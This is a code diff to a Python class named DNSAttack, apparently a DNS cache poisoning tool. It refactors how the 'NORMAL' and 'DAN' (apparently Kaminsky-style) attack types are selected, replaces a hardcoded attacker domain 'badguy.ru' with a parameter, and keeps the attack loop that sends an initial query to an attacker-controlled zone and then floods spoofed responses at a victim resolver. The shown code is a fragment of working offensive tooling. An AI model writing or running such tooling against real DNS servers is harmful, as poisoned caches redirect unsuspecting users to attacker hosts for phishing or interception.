@@ -52,7 +52,7 @@ class DNSAttack:
 
     def __init__(self, victim_server_ip, attacked_domain, bad_server_data,\
          attacker_ip, bad_domain, ns_server_ip=None, victim_mac=None, nic_interface=None,\
-             attack_type=None, sigint_handler=None, log_function=lambda msg: None):
+            sigint_handler=None, log_function=lambda msg: None):
 
         # Victim IP address
         self.victim_server_ip = victim_server_ip
@@ -91,13 +91,6 @@ class DNSAttack:
             self.ns_server_ip = self.get_authoritative_server(self.domain, self.victim_server_ip)
         else:
             self.ns_server_ip = ns_server_ip
-
-        #Set the attack type
-        if attack_type is None or attack_type == DNSPoisoning.AttackType.NORMAL:
-            self.attack_type = DNSPoisoning.AttackType.NORMAL
-        else:
-            self.attack_type = DNSPoisoning.AttackType.DAN
-
 
 
     #Exceptions
@@ -298,7 +291,7 @@ class DNSAttack:
     #   @exceptions Raise DNSAttack::SuccessfulAttack in case of successful attack.\n
     #   @exceptions Raise DNSAttack::CriticalError in case of error.\n
     #   @exceptions Raise DNSAttack::InvalidAttackType in case an invalid attack type is provided.\n
-    def start(self, number_of_tries=50, mode=Mode.NORMAL, attack_type=DNSPoisoning.AttackType.NORMAL):
+    def start(self, number_of_tries=50, mode=Mode.NORMAL, attack_type="NORMAL"):
 
         succeded = False
         num = number_of_tries
@@ -318,6 +311,18 @@ class DNSAttack:
             flood_socket = DNSPoisoning.create_socket(self, self.nic_interface)
         #----------------------------------------
 
+        # Set the attack type attribute if was not previously set
+        
+        if attack_type == "NORMAL":
+            self.attack_type = DNSPoisoning.AttackType.NORMAL
+        elif attack_type == "DAN":
+            self.attack_type = DNSPoisoning.AttackType.DAN
+        else:
+            raise self.InvalidAttackType
+        
+
+
+
         # Attack Loop
         while number_of_tries and not succeded and not self.stop_flag:
 
@@ -331,7 +336,7 @@ class DNSAttack:
             pool = ThreadPool(processes=1)
             async_data_result = pool.apply_async(self.get_server_data)
 
-            self.log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"")
+            self.log("\n\nStart sending the first request to \"{t.italic}" + str(self.bad_domain) + "{t.normal}\"")
             try:
                 self.send_initial_query()   # Send the query related to attacker control zone
             except self.InitialQueryFailed:
@@ -351,15 +356,18 @@ class DNSAttack:
             poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, self.ns_server_ip, fetched_id, sport = source_port,\
                 victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)
 
+            print(self.attack_type)
+
             # Set the attack type
             #--------------------------------------------------------
-            if attack_type == DNSPoisoning.AttackType.NORMAL:
+            if self.attack_type == DNSPoisoning.AttackType.NORMAL:
                 self.log("Ok, let's try to perform \"{t.italic}Classical's Shenanigans{t.normal}\" attack")
                 poison.set_attack_type(DNSPoisoning.AttackType.NORMAL)
-            elif attack_type == DNSPoisoning.AttackType.DAN:
+            elif self.attack_type == DNSPoisoning.AttackType.DAN:
                 self.log("Ok, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\" attack")
                 poison.set_attack_type(DNSPoisoning.AttackType.DAN)
             else:
+                self.log("Invalid attack type selected")
                 raise self.InvalidAttackType
             #--------------------------------------------------------
 
